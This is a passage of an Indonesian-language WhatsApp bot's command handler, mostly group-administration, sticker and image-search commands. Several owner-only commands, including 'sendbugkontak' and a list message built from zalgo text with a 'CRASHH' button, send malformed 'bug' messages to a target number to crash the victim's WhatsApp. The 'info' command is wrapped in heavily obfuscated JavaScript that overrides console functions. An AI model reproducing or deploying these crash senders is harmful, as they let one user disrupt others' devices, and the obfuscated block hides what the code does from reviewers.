̶̛́͡͠.̗̲̗̖̬̫̐̑ͧ̋̓̊̌͒",
                  buttonText: "🔥🔥🔥🔥🔥🔥🔥🔥CRASHH!!!🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥",
                  sections
                 }
               client.sendMessage(Pe, listMessage, {quoted:msg.kon})
              client.sendMessage(from, { text: `Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`, mentions: [Pe] }, { quoted : msg.fpay }) 
             } catch (err){ console.log(err)
                 msg.reply("Gagal mengirim bug, Terjadi Error")
             }
           }
           break
           //
           case prefix+'getcase':{
               if(!q) return msg.reply("mau ambil case yang mana?")
               if(!isOwner) return msg.reply("Khusus Owner!") 
                  let anu = await client.getCase(q)
               msg.reply(anu)
             }
           break
          //
         case prefix+'ssweb':{
              if (!q) return reply('Harap sertakan link!')
                client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
               client.sendMessage(from, { image: { url : 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q }, caption: `Result✔️`}, { quoted: msg } )
           }
         break
         //
        case prefix+'sendbugkontak':{
           if(!q) return msg.reply("Masukan nomer target")
           if(!isOwner) return msg.reply("Khusus Owner!") 
            try{
               await msg.reply("Sending...")
               let Pe = mentionByTag[0]? mentionByTag[0] : mentionByreply ? mentionByreply : q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
               let bugs = contact
                  client.sendBugContact(Pe, bugs, msg.kon)
                  client.sendMessage(from, { text: `Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`, mentions: [Pe] }, { quoted : msg.fpay }) 
               } catch (err){
                 console.log(err)
                 msg.reply("Gagal mengirim bug, Terjadi Error")
               }
           }
         break
          //
         case prefix+'swm': case prefix+'stickerwm': case prefix+'wm': case prefix+'curi': case prefix+'colong': case prefix+'take': {  
            let text1 = q.split("|")[0]
            let text2 = q.split("|")[1]
              if (!msg.isQuotedSticker) return msg.reply(`Harus berupa sticker! (reply stikernya)\n\nmessage: {\n Anda tidak bisa mencuri\n dan menamai sesuatu selain sticker\n dengan fitur ini!\n }`)   
              if (!text1) return msg.reply(`Contoh! : ${order + ' ' + 'tes|rifza'}`)    
              if (!text2) return msg.reply(`Contoh! : ${order + ' ' + 'tes|rifza'}`)
                client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
          try{ 
             let buff = await client.downloadMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
             console.log(buff)
             let proc = await writeExifStc(buff, { packname: text1, author: text2 })
             await client.sendMessage(from, { sticker: { url: proc } }, { quoted: msg })
             await fs.unlinkSync(proc)
           } catch (e) { msg.reply(e) }
          }
          break
          //
         case prefix+'hidetag': {
             if (!isGroup) return msg.reply('Khusus Grup')
             if (!isGroupAdmins) return msg.reply('Khusus Admin')
             if (!isBotGroupAdmins) return msg.reply('Bot harus jadi Admin')
             if (args.length < 1) return msg.reply('Teks?')
                 client.sendMessage(from, { text : args.join(" ") ? args.join(" ") : '' , mentions: groupMembers.map(a => a.id)}, { quoted: msg })
             }
          break
          case prefix+'deposit':{  
               if (fs.existsSync('./' + msg.sender + '.json')) return
                  fs.writeFileSync(`./${msg.sender}.json`, JSON.stringify({ depo: false}, null, 2))
           }
          break
          case prefix+'ohidetag': {
              if (!isGroup) return msg.reply('Khusus Grup')
              if (!msg.key.fromMe && !isOwner) return msg.reply("Khusus owner!")
              if (args.length < 1) return msg.reply('Teks?')
                   client.sendMessage(from, { text : args.join(" ") ? args.join(" ") : '' , mentions: groupMembers.map(a => a.id)}, { quoted: msg })
            }
          break
          //
          case prefix+'promote':{
               // title & participant
               if (!isGroupAdmins) return mag.reply('Khusus Admin')
               if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')
                    console.log(mentionUser)
                    let menz = mentionUser
                         await client.groupParticipantsUpdate(from, mentionUser, "promote")
	              client.sendMessage(from, { text: `@${msg.user.split("@")[0]}`, mentions: [mentionUser] }, { quoted : msg })  
	         .catch((err) => msg.reply(err) ) }
           break
           //
          case prefix+'anu':{
                fetchJson(q)  
           }
          break
          //
          case prefix+'demote':{
              // title & participant
              if (!isGroupAdmins) return msg.reply('Khusus Admin')
              if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')
                  console.log(mentionUser)
               client.groupParticipantsUpdate(from, mentionUser, "demote")
        	.catch((err) => msg.reply(err) ) }
          break 
            //
          case prefix+'inv':{
               const response = await client.groupParticipantsUpdate(from, 'oy')
               let o = await response[0]
               let inv = (Object.values(o))
                    client.sendGroupV4Invite(from, from, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
           }
          break
           //
          case prefix+'add':{
           if (!isGroup) return msg.reply('Khusus Grup')
           if (!isGroupAdmins) return msg.reply('Khusus Admin')
           if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')
             if (args[1]){
                 let number = msg.quoted ? msg.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
                 let response = await client.groupParticipantsUpdate(from, [number], "add")
                 let o = await response[0]
                 let inv = o.status       
                       if(inv == 408) return msg.reply('Dia baru-baru saja keluar dari grub ini!')
                       if(inv == 409) return msg.reply('Dia sudah join!')
                       if(inv == 500) return msg.reply('Grub penuh!')
                       if(inv == 403){
                             client.sendMessage(from, { text: `@${number.split('@')[0]} tidak dapat ditambahkan karena target private acc*\nUndangan akan dikirimkan ke -> wa.me/${q.replace(/[^0-9]/g, '')} Melalui jalur pribadi`, mentions: [number] }, { quoted : msg }) 
                             client.sendMessage(`${number}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin:\nwa.me/${msg.sender}\n Mengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, mentions: [number] }, { quoted : msg }) 
                        } else { msg.reply('Errr')  }
                        console.log(inv)
              } else {
                    let response = await client.groupParticipantsUpdate(from, mentionUser, "add")
                    let o = await response[0]
                    let inv = o.status
                    let invv = await client.groupInviteCode(from) 
                      console.log(inv)
                      console.log(mentionUser)
                       if(inv == 408) return msg.reply('Dia baru-baru saja keluar dari grub ini!')
                       if(inv == 409) return msg.reply('Dia sudah join!')
                       if(inv == 500) return msg.reply('Grub penuh!')
                       if(inv == 403){
                            client.sendMessage(from, { text: `${mentionUser} tidak dapat ditambahkan karena target private acc*\nUndangan akan dikirimkan ke -> wa.me/${mentionUser} Melalui jalur pribadi`, mentions: [mentionUser] }, { quoted : msg }) 
                            client.sendMessage(`${mentionUser}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin:\nwa.me/${msg.sender}\n Mengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, mentions: [mentionUser] }, { quoted : msg }) 
                         } else { msg.reply('Errr') }
                        console.log(inv)
              }   }
           break
            //
            case prefix+'kick':{
                 if (!isGroup) return msg.reply('Khusus Grup')
                 if (!isGroupAdmins) return msg.reply('Khusus Admin')
                 if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')     
                 if (!mentionUser) return msg.reply('Tag atau msg.reply member yg akan di kick!!')
                     console.log(mentionUser)
                  client.groupParticipantsUpdate(from, mentionUser, "remove")
              }
             break  
             //
             case prefix+'setdesc': case prefix+'setdescription':{
                   if (!isGroup) return msg.reply('Khusus Grup')
                   if (!isGroupAdmins) return msg.reply('Khusus Admin')
                   if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')     
                   if (!q) return msg.reply('Sertakan teks deskripsi baru!')  
                        console.log('PERBARUI DESKRIPSI GROUP', color(groupName, 'cyan'))
                    client.groupUpdateDescription(from, q)
              }
             break
             //
            case prefix+'setsubjek': case prefix+'setsubject': case prefix+'setnamegc':{
                   if (!isGroup) return msg.reply('Khusus Grup')
                   if (!isGroupAdmins) return msg.reply('Khusus Admin')
                   if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')     
                   if (!q) return msg.reply('Sertakan teks untuk menamai grub ini dengan nama baru!')  
                       console.log('PERBARUI NAMA GROUP', color(groupName, 'cyan'))
                       await client.groupUpdateSubject(from, q)
              }
             break
              //
             case prefix+'tagall':{
                  let teks = `     「 Sebutkan Peserta 」  \n\n⇨ Pesan : ${args.join(" ") ? args.join(" ") : 'nundefined'}\n\n`
                   for (let mem of groupMembers) {
                      teks += `⇨ @${mem.id.split('@')[0]}\n`
                    }
                client.sendMessage(from, { text: teks, mentions: groupMembers.map(a => a.id) }, { quoted: msg })
               }
             break
              //
             case prefix+'group': case prefix+'grup': case prefix+'grub': case prefix+'gc':{
                  if (!isGroup) return msg.reply('Khusus Grup')
                  if (!isGroupAdmins) return msg.reply('Khusus Admin')
                  if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')         
                  if (!args[0]) return msg.reply('| open || close || locked-change || unlocked-change || invitelink || revokeinvitelink || setpp |')
                  if (args[0] === "close" || args[0] === "tutup") {          
                       await client.groupSettingUpdate(from, 'announcement')
                       console.log('MENUTUP GROUP', color(groupName, 'cyan'))
                       msg.reply('success✓')
                  } else if (args[0] === "open" || args[0] === "buka") {          
                       await client.groupSettingUpdate(from, 'not_announcement')
                       console.log('MEMBUKA GROUP', color(groupName, 'cyan'))
                       msg.reply('success✓')
                  } else if (args[0] === "locked-change") {              
                       await client.groupSettingUpdate(from, 'locked')
                       console.log('HANYA ADMIN YANG DAPAT MENGEDIT GROUP', color(groupName, 'cyan'))
                       msg.reply('success✓')
                  } else if (args[0] === "unlocked-change") {              
                       await client.groupSettingUpdate(from, 'unlocked')
                       console.log('SEMUA PESERTA DAPAT MENGEDIT GROUP', color(groupName, 'cyan'))
                       msg.reply('success✓')
                  } else if (args[0] === "invitelink") {
                      let inv = await client.groupInviteCode(from) 
                      msg.reply('https://chat.whatsapp.com/' + inv)
                  } else if (args[0] === "revokeinvitelink") {
                      console.log('PEMBARUAN GROUP INVITE CODE', color(groupName, 'cyan'))
                      await client.groupRevokeInvite(from)
                      msg.reply('success✓')
                  } else if (args[0] === "setpp") {
                      if (!msg.isQuotedImage) return msg.reply('Reply gambar yang akan dijadikan ikon group!')
                         client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
                         let buffer = await client.downloadMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')     
                         let { bufferzzz } = await client.generateProfilePicture(buffer)
                          await client.query({ tag: 'iq', 
                               attrs: { to: from, type:'set', xmlns: 'w:profile:picture' },
                               content: [{ tag: 'picture', attrs: { type: 'image' }, content: bufferzzz }]
                          })
                     console.log('PEMBARUAN IKON GROUP', color(groupName, 'cyan'))       
                     msg.reply('success✓')
                  } else { msg.reply('kata kunci tidak ditemukan') }
               } 
             break
               //
             case prefix+'setpp': case prefix+'setppbot':{
                 if(!isOwner) return msg.reply('Khusus owner!!!!')
                  client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
                 let buffer = await client.downloadMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')     
                 let { bufferzzz } = await client.generateProfilePicture(buffer)
                 await client.query({ tag: 'iq', 
                   attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture' },
                   content: [{ tag: 'picture', attrs: { type: 'image' }, content: bufferzzz }]
                 })
               msg.reply('success✓')
              }
             break
             //
            case prefix+"payement":{
                await client.payement(from)
              }
            break
            //
            case prefix+'repeat':{
                let text1 = q.split("|")[0]
                let text2 = q.split("|")[1]
                  if (!text1) return msg.reply(`Contoh! : ${order + ' ' + 'tes|30'}`)    
                  if (!text2) return msg.reply(`Contoh! : ${order + ' ' + 'tes|30'}`)
                  let txtzh = `${text1}`.repeat(text2)
               msg.reply(txtzh)
              }
           break
          //
           case prefix+'r':{
               let anu = await autoReply(q)
                 console.log(anu)
              msg.reply(anu)
            }
           break
           //
          case prefix+"join":{
             if(!isOwner) return msg.reply('Khusus owner!!!!')
             var link = args[0].split("https://chat.whatsapp.com/")[1]
                 if (!link) return reply("Invalid Link!")
            client.groupAcceptInvite(link).then(async(res) => msg.reply(jsonformat(res))).catch(_ => _)
           }
          break
          //
          case prefix+'id':{
            msg.reply(from)
           }
          break
          //
          case prefix+'pin': case prefix+'pinterest':{
           if (args.length < 1) return msg.reply('Cari gambar apa?')
             client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
              try{
               const pint = await pinterest(`${q}`)
               let xm_za = pint[Math.floor(Math.random() * pint.length)];
                console.log(xm_za)
               let buttons = [
               {  buttonId: `#pinterest ${q}`, 
                 buttonText: {  displayText: 'Next'
               }, type: 1},
               ]
              let buttonMessage = {
                 image: { url: xm_za },
                 caption: `[ PINTEREST SEARCH ]\nHasil dari pencarian ${args.join(' ')}`,
                 footer: SETTING.botname,
                 buttons: buttons,
                 headerType: 4
               }
               await client.sendMessage(from, buttonMessage, { quoted: msg })
             } catch (e) { e = String(e)
                msg.reply('Tidak ditemukan!')
            }
           }
         break

/*                                                        \\

                Malas mau rapiiin 😅

*/                                                        //

 
  case prefix+'owner': case prefix+'creator':{
   client.sendContact(from, global.ownerNumber, msg.fpay)
  }
  break
  case prefix+'info': case prefix+'inviteinfo': case prefix+'inspect': {
  (function(_0x1a673c,_0x53f6ef){const _0x48f76f=_0x1a673c();function _0x23a220(_0x57575d,_0x3b840c,_0x15505a,_0x5742dd){return _0x2365(_0x5742dd- -0x16b,_0x3b840c);}function _0x5a087a(_0x230996,_0x39b0d4,_0x129b1c,_0x33a059){return _0x2365(_0x33a059- -0x190,_0x129b1c);}while(!![]){try{const _0x8c47ac=parseInt(_0x23a220(0x84,0xcc,0xc0,0xac))/(-0x1309+0x1828+0x5*-0x106)*(-parseInt(_0x5a087a(0x77,0x83,0x64,0x5f))/(-0x1205+-0x1b29+0x2d30))+parseInt(_0x5a087a(0x61,0x90,0x66,0x8f))/(-0x25a*-0x2+-0x3d*0x1+-0x6*0xbe)*(-parseInt(_0x5a087a(0x77,0xee,0xba,0xae))/(0x2554+-0x62c*-0x1+-0x2b7c))+parseInt(_0x23a220(0x97,0x7f,0x46,0x87))/(-0x1*-0x7e3+-0x413*-0x5+0x1c3d*-0x1)+parseInt(_0x5a087a(0x1,0x40,0x26,0x2c))/(-0x1*-0x253b+-0x1*0x13c7+0x1*-0x116e)*(-parseInt(_0x5a087a(0xa3,0x6e,0xa4,0x8d))/(-0x315*0x7+-0x1dd2+-0x1124*-0x3))+-parseInt(_0x5a087a(0x90,0x4d,0x13,0x56))/(-0x1*0x509+0x1de0+-0x18cf)+parseInt(_0x5a087a(0xca,0xda,0x77,0xb3))/(0x113d+-0xafc+-0x638)*(parseInt(_0x5a087a(0x3,0x17,0x3d,0x46))/(0x4*0x925+-0x3*0x14b+0xae3*-0x3))+parseInt(_0x5a087a(0xb0,0x58,0x8c,0x7f))/(0x5e4+-0x283*-0xf+-0x2*0x15c3);if(_0x8c47ac===_0x53f6ef)break;else _0x48f76f['push'](_0x48f76f['shift']());}catch(_0x235d4b){_0x48f76f['push'](_0x48f76f['shift']());}}}(_0xe2d5,-0x1b7*-0x595+-0xfc9d+-0x31bfa));const _0xbcd25c=(function(){const _0x4da4ab={'GHWok':function(_0x3550a5,_0x8f5958){return _0x3550a5(_0x8f5958);},'JmaEx':_0x5f4eca(0x3d9,0x3f7,0x400,0x3bb)+_0x5f4eca(0x342,0x37d,0x366,0x37e),'irpfA':_0x58695a(0x34e,0x32c,0x37c,0x33e)+'ctor(\x22retu'+_0x5f4eca(0x3ad,0x370,0x39c,0x36d)+'\x20)','vBBOV':_0x58695a(0x31f,0x35d,0x2da,0x31c),'ZmlGQ':_0x58695a(0x302,0x2ec,0x30b,0x317),'RnNYM':'trace','lILHA':'AXnDZ'};function _0x58695a(_0xd1adad,_0x3ba8ad,_0x38a1d2,_0x201817){return _0x2365(_0xd1adad-0x142,_0x38a1d2);}let _0x4b2066=!![];function _0x5f4eca(_0x569a4f,_0xd6221f,_0x5d9a77,_0x51f461){return _0x2365(_0x51f461-0x192,_0x569a4f);}return function(_0x3206e5,_0x23bcdd){const _0x1a6bc6={'Cspjp':function(_0x55a50c,_0x53e56c){function _0x3bf0e9(_0x485d61,_0xe66f73,_0x54462c,_0x4409b1){return _0x2365(_0x485d61-0x115,_0xe66f73);}return _0x4da4ab[_0x3bf0e9(0x32e,0x2ee,0x35e,0x31b)](_0x55a50c,_0x53e56c);},'sGgpC':function(_0x2e2e28,_0x44fbd2){return _0x2e2e28+_0x44fbd2;},'NBJTf':function(_0x104e54,_0x2d9406){return _0x104e54+_0x2d9406;},'UapWs':_0x4da4ab[_0x2d60e3(0x3c5,0x3fe,0x405,0x3ec)],'tucdD':_0x4da4ab[_0x2d60e3(0x41d,0x42d,0x444,0x470)],'KoFin':function(_0x1035c4){return _0x1035c4();},'AxHCL':_0x4da4ab['vBBOV'],'UXeKQ':_0x4da4ab['ZmlGQ'],'OpgGh':_0x4da4ab[_0x57827d(-0x88,-0x76,-0xa1,-0xa4)]};function _0x57827d(_0x5761b5,_0x4780a8,_0x4463f7,_0x569cfe){return _0x58695a(_0x4463f7- -0x41c,_0x4780a8-0x96,_0x569cfe,_0x569cfe-0xf9);}function _0x2d60e3(_0xaba82d,_0x3555ca,_0x332172,_0x510f5d){return _0x5f4eca(_0x332172,_0x3555ca-0x176,_0x332172-0xa4,_0x3555ca-0xa5);}if(_0x4da4ab[_0x57827d(-0xb5,-0xc9,-0xb3,-0xcd)]==='pxlUU'){let _0xfd4323;try{const _0x167245=_0x1a6bc6['Cspjp'](_0x1fa0dd,_0x1a6bc6[_0x57827d(-0xf8,-0xf2,-0x100,-0x10b)](_0x1a6bc6[_0x57827d(-0x90,-0x95,-0xc2,-0xa2)](_0x1a6bc6[_0x57827d(-0xcf,-0x68,-0x9d,-0xbc)],_0x1a6bc6[_0x2d60e3(0x463,0x430,0x473,0x430)]),');'));_0xfd4323=_0x1a6bc6[_0x2d60e3(0x422,0x3f4,0x3b2,0x3ee)](_0x167245);}catch(_0x2475f3){_0xfd4323=_0x4063f3;}const _0x141893=_0xfd4323['console']=_0xfd4323[_0x2d60e3(0x42d,0x41f,0x415,0x3e5)]||{},_0x574e03=[_0x1a6bc6[_0x2d60e3(0x49d,0x459,0x464,0x494)],_0x2d60e3(0x412,0x40c,0x40f,0x439),_0x1a6bc6['UXeKQ'],_0x57827d(-0xec,-0x79,-0xba,-0xfa),_0x2d60e3(0x49d,0x468,0x441,0x42b),_0x2d60e3(0x425,0x462,0x420,0x48b),_0x1a6bc6['OpgGh']];for(let _0x471b78=-0x2241+-0x11a9*0x2+-0x7bb*-0x9;_0x471b78<_0x574e03[_0x57827d(-0x8d,-0x93,-0xa5,-0xe8)];_0x471b78++){const _0x4f7f3d=_0x44b4da[_0x57827d(-0xac,-0xf6,-0xc8,-0xb8)+'r'][_0x57827d(-0x135,-0x112,-0x107,-0x11c)][_0x2d60e3(0x442,0x42b,0x429,0x462)](_0xff0fd0),_0x4bd7fe=_0x574e03[_0x471b78],_0x4d7874=_0x141893[_0x4bd7fe]||_0x4f7f3d;_0x4f7f3d[_0x2d60e3(0x3d3,0x407,0x416,0x413)]=_0xd2bf0[_0x2d60e3(0x428,0x42b,0x3f5,0x44f)](_0x498d23),_0x4f7f3d[_0x57827d(-0x11e,-0xfb,-0x116,-0x150)]=_0x4d7874[_0x2d60e3(0x3f0,0x3fb,0x41d,0x40a)]['bind'](_0x4d7874),_0x141893[_0x4bd7fe]=_0x4f7f3d;}}else{const _0x5b0a88=_0x4b2066?function(){function _0x3aa8f0(_0x39509a,_0x26500a,_0x188026,_0x4ea5c4){return _0x57827d(_0x39509a-0xa4,_0x26500a-0xbe,_0x188026-0x563,_0x4ea5c4);}if(_0x23bcdd){const _0x206944=_0x23bcdd[_0x3aa8f0(0x47c,0x4ab,0x47e,0x4b3)](_0x3206e5,arguments);return _0x23bcdd=null,_0x206944;}}:function(){};return _0x4b2066=![],_0x5b0a88;}};}()),_0x1df37a=_0xbcd25c(this,function(){const _0x2b13e3={};_0x2b13e3[_0x1541e9(0x4ab,0x454,0x479,0x45b)]=_0x1541e9(0x479,0x48e,0x489,0x458)+'+$';const _0xb2584a=_0x2b13e3;function _0x1541e9(_0x5c811b,_0x57f856,_0x59d064,_0x17865e){return _0x2365(_0x59d064-0x26e,_0x57f856);}function _0x35e6fc(_0x4ac7cd,_0x4d2785,_0x26770f,_0x1bae78){return _0x2365(_0x26770f-0x1e8,_0x1bae78);}return _0x1df37a[_0x1541e9(0x428,0x467,0x432,0x44a)]()[_0x35e6fc(0x3b0,0x3e0,0x3bc,0x3ab)](_0xb2584a[_0x35e6fc(0x3cb,0x3f3,0x3f3,0x3e2)])[_0x35e6fc(0x3b5,0x38e,0x3ac,0x3e9)]()['constructo'+'r'](_0x1df37a)['search'](_0x1541e9(0x4b3,0x49d,0x489,0x47b)+'+$');});function _0x58d0c1(_0x5b724a,_0x9e494c,_0x3dc487,_0x354dde){return _0x2365(_0x5b724a- -0x117,_0x9e494c);}_0x1df37a();const _0x5ce63e=(function(){function _0x2a1d88(_0x1dbb0d,_0x5c2107,_0x4c1d6d,_0xb3ceff){return _0x2365(_0xb3ceff-0x2d9,_0x5c2107);}const _0xed21df={};_0xed21df['lMBSk']=function(_0x3f33b3,_0x3f9e1e){return _0x3f33b3===_0x3f9e1e;},_0xed21df[_0x2a1d88(0x4ed,0x51d,0x51a,0x4ec)]=_0x348ef8(0x1ab,0x1c7,0x1b1,0x1e9);function _0x348ef8(_0x15225e,_0x223097,_0x4286df,_0x5a9ec9){return _0x2365(_0x4286df- -0x1a,_0x5a9ec9);}_0xed21df[_0x348ef8(0x1b9,0x1cd,0x1e0,0x1a6)]=_0x2a1d88(0x4b7,0x475,0x4d8,0x4a2)+_0x2a1d88(0x49d,0x517,0x497,0x4da)+_0x2a1d88(0x551,0x4e9,0x4cf,0x50c)+_0x2a1d88(0x4d1,0x4ec,0x52d,0x4ee)+_0x348ef8(0x18e,0x194,0x1d1,0x1b1),_0xed21df[_0x348ef8(0x226,0x1ff,0x202,0x1d0)]=function(_0x3a52ec,_0x16c6c1){return _0x3a52ec!==_0x16c6c1;},_0xed21df[_0x2a1d88(0x4a1,0x4dc,0x488,0x4c0)]=_0x2a1d88(0x539,0x4e2,0x4e5,0x50b);const _0xc0826f=_0xed21df;let _0x49ce6e=!![];return function(_0x371d6f,_0x2cd4c2){function _0x44f880(_0x2de651,_0x15f5a8,_0x5450fa,_0x545769){return _0x2a1d88(_0x2de651-0xf5,_0x545769,_0x5450fa-0x112,_0x15f5a8- -0x1c5);}const _0x460e4b={'oXFok':function(_0x3ac8a6,_0x48ba91){return _0xc0826f['lMBSk'](_0x3ac8a6,_0x48ba91);},'YIIGM':_0xc0826f[_0x44f880(0x30a,0x327,0x353,0x35d)],'howmY':_0xc0826f[_0x44f880(0x34f,0x30e,0x2eb,0x2de)]};function _0x1d491f(_0x5ac106,_0x417157,_0x15e355,_0x13f992){return _0x2a1d88(_0x5ac106-0x27,_0x13f992,_0x15e355-0xa9,_0x417157- -0x17e);}if(_0xc0826f[_0x1d491f(0x3a6,0x377,0x334,0x355)](_0xc0826f[_0x44f880(0x305,0x2fb,0x2c8,0x334)],'GKyKX')){const _0x5448c9=_0x49ce6e?function(){function _0x42d648(_0x14b896,_0x37c789,_0x3c9cc5,_0x5cce94){return _0x1d491f(_0x14b896-0x123,_0x5cce94- -0xbc,_0x3c9cc5-0x109,_0x37c789);}function _0x418a9d(_0x519e18,_0x375fc1,_0x10ca10,_0x18aade){return _0x44f880(_0x519e18-0x55,_0x18aade- -0x2f6,_0x10ca10-0x19e,_0x10ca10);}if(_0x2cd4c2){if(_0x460e4b[_0x42d648(0x2e8,0x2bb,0x262,0x2a5)](_0x460e4b[_0x42d648(0x313,0x30b,0x2de,0x2d7)],_0x460e4b['YIIGM'])){const _0x49bd78=_0x2cd4c2[_0x418a9d(-0xb,0x41,-0x10,0x13)](_0x371d6f,arguments);return _0x2cd4c2=null,_0x49bd78;}else{const _0x14c1f2=_0x3bda55['apply'](_0x23d379,arguments);return _0x3efceb=null,_0x14c1f2;}}}:function(){};return _0x49ce6e=![],_0x5448c9;}else _0x395303=_0x460e4b[_0x44f880(0x347,0x340,0x365,0x384)];};}()),_0x1d46ad=_0x5ce63e(this,function(){const _0x143fc4={'EwsGe':function(_0x2f98ca,_0x3ed405){return _0x2f98ca+_0x3ed405;},'CfJrQ':_0x4c52a5(0xe6,0xf1,0x10c,0x128)+_0x4c52a5(0x103,0x106,0xee,0xc6)+_0x3bb78d(0x196,0x17c,0x15e,0x1af)+'\x20)','Ypzer':function(_0x3e750e){return _0x3e750e();},'FYNRc':'log','VtymF':_0x4c52a5(0x9b,0x98,0xd5,0xce),'gzUAm':_0x4c52a5(0x142,0x128,0x104,0xcf),'pSDPW':_0x4c52a5(0x11c,0x106,0x105,0x144)};let _0x1c1b5f;function _0x4c52a5(_0x293f62,_0x27204c,_0x5d96f4,_0x387b90){return _0x2365(_0x5d96f4- -0x100,_0x293f62);}function _0x3bb78d(_0x453413,_0x537e4c,_0x45c904,_0x17f929){return _0x2365(_0x453413- -0x45,_0x17f929);}try{const _0x2d6b73=Function(_0x143fc4[_0x3bb78d(0x19d,0x191,0x19c,0x16c)](_0x143fc4[_0x4c52a5(0xc7,0x10e,0xe2,0xd5)](_0x3bb78d(0x1e4,0x205,0x1ef,0x228)+'nction()\x20',_0x143fc4['CfJrQ']),');'));_0x1c1b5f=_0x143fc4[_0x3bb78d(0x194,0x1d5,0x180,0x1ac)](_0x2d6b73);}catch(_0x5caf9f){_0x1c1b5f=window;}const _0x1fd569=_0x1c1b5f['console']=_0x1c1b5f['console']||{},_0x3ec10e=[_0x143fc4[_0x4c52a5(0x143,0x118,0x103,0xce)],_0x143fc4[_0x3bb78d(0x1fc,0x238,0x232,0x205)],_0x3bb78d(0x17b,0x1ad,0x1b3,0x18c),'error',_0x4c52a5(0x161,0x11c,0x131,0x122),_0x3bb78d(0x1e6,0x1b4,0x1e4,0x1fb),_0x4c52a5(0xf4,0xf6,0xbf,0xf7)];for(let _0x4bf819=-0x704+0x70d*-0x1+0x115*0xd;_0x4bf819<_0x3ec10e['length'];_0x4bf819++){if(_0x143fc4['gzUAm']!==_0x143fc4[_0x4c52a5(0x109,0x107,0x110,0xf4)]){const _0x342d2f=_0x5ce63e['constructo'+'r'][_0x3bb78d(0x18e,0x15a,0x14b,0x150)][_0x4c52a5(0x133,0x131,0xf4,0xe0)](_0x5ce63e),_0xe39dc4=_0x3ec10e[_0x4bf819],_0x49233a=_0x1fd569[_0xe39dc4]||_0x342d2f;_0x342d2f[_0x3bb78d(0x18b,0x168,0x153,0x1a1)]=_0x5ce63e[_0x4c52a5(0xca,0xd0,0xf4,0x119)](_0x5ce63e),_0x342d2f['toString']=_0x49233a[_0x4c52a5(0xd7,0xa1,0xc4,0xed)][_0x3bb78d(0x1af,0x1cb,0x16d,0x1f4)](_0x49233a),_0x1fd569[_0xe39dc4]=_0x342d2f;}else{const _0x26c960=_0x3e8764['apply'](_0x10c92d,arguments);return _0x139264=null,_0x26c960;}}});_0x1d46ad();if(!q)return msg[_0x58d0c1(0x111,0x125,0x11e,0xe1)](_0x58d0c1(0xc8,0xc9,0xd8,0x107)+_0x129c70(0x540,0x5b5,0x571,0x572)+_0x129c70(0x510,0x54d,0x51d,0x4fa));let _LinkINV=q[_0x58d0c1(0x11d,0x160,0x131,0x104)](_0x129c70(0x4e8,0x558,0x513,0x523)+'at.whatsap'+_0x129c70(0x52c,0x54e,0x50f,0x53b))[-0x930+0x1*0x9db+-0x5*0x22];function _0xe2d5(){const _0x311a41=['bind','apply','irpfA','update\x20at\x20','⇨\x20ID\x20:\x20','tucdD','qBPJn','AMKbq','UkiRO','query','@g.us','Link\x20tidak','w:g2','legra.ph/f','ate\x20at\x20:\x20','FYNRc','cSYOw','owlxS','oXFok','GdYuQ','t\x20:\x20','invite','⇨\x20Subject\x20','ReioR','{}.constru','get','Asia/Jakar','10505627ScTzwD','pSDPW','participan','constructo','KqXrE','AfjaW','2094dfa87c','QiStU','10CHPNBZ','NBJTf','GHWok','mAfTy','(((.+)+)+)','JIcyY','33523VCNkNi','size','1303440BARTUV','error','NImDN','AxHCL','jvuyo','then','\x20Link\x20Info','sendMessag','lILHA','reply','return\x20(fu','\x20valid!','table','howmY','type','⇨\x20Desc\x20upd','Wzawe','akan\x20link\x20','exception','wgZXk','ile/265c67','split','length','url','vZMoF','YIIGM','RnNYM','xmlns','tag','\x20Member\x0a','UapWs','4luJkzI','s_o','profilePic','VtymF','tureUrl','602811NoARLi','y\x20:\x20','120woSMYe','KoFin','format','trace','info','⇨\x20Create\x20a',',\x20HH:mm:ss','content','toString','parseMenti','subject','JmaEx','image','https://te','No\x20Descrip','FmKoc','bEbia','⇨\x20Desc\x20id\x20','p.com/','creation','__proto__','tion','https://ch','prototype','search','warn','30srTfqh','ate\x20by\x20:\x20','DD-MM-YYYY','Ypzer','sGgpC','rn\x20this\x22)(','grub!','log','ion\x20:\x20\x0a','Harap\x20sert','⇨\x20Create\x20b','⇨\x20Total\x20Me','EwsGe','creator','attrs','mbers\x20:\x20','4673336fcTdjs','oYzPi','console','KfJOV','s_t','aea19.jpg','nction()\x20','ehUzE','ctor(\x22retu','24218LZcfue','jid','undefined','2192075dEfNQZ','fkontak'];_0xe2d5=function(){return _0x311a41;};return _0xe2d5();}if(!_LinkINV)return msg['reply'](_0x58d0c1(0xe8,0xb6,0x129,0xe1)+_0x129c70(0x59c,0x5af,0x56b,0x53a));function _0x2365(_0x214928,_0x1df37a){const _0xbcd25c=_0xe2d5();return 